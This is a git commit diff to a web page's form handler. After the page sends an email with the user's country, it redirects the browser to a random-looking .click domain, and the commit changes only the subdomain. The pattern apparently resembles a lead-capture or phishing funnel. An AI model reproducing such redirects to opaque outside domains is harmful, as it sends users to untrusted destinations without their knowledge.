f4e360aef66f7a5af3dcad4a9d9988fbd91ef52c
husknet <127146284+husknet@users.noreply.github.com>
2024-09-26 11:16:30 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://nero.newtslozwexch.click';
+        window.location.href = 'https://neji.newtslozwexch.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
